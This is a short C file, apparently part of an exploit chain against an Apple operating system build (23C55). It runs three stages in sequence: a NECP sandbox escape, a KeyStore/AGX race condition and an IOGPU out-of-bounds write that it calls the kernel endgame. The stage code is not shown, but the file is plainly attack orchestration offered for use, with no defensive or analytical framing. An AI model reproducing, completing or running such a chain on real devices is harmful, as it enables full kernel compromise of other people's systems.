/* chain.c — sandbox-escape + race + IOGPU OOB chain runner (23C55). *
 * Stage 1: nk_dataonly_necp_chain()  — NECP dataOnly sandbox stage. *
 * Stage 2: nk_racer_run()            — KeyStore/AGX race harness.   *
 * Stage 3: nk_iogpu_oob_run()        — IOGPU OOB = kernel endgame.  */
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include "exploit.h"

void nk_chain_run(void) {
    nk_filelog_open("chain");
    nk_log("[ch] chain stage 1: NECP dataOnly");
    nk_dataonly_necp_chain();
    nk_log("[ch] chain stage 2: race");
    nk_racer_run();
    nk_log("[ch] chain stage 3: IOGPU OOB");
    nk_iogpu_oob_run();
    nk_log("[ch] chain end");
    nk_filelog_close();
}
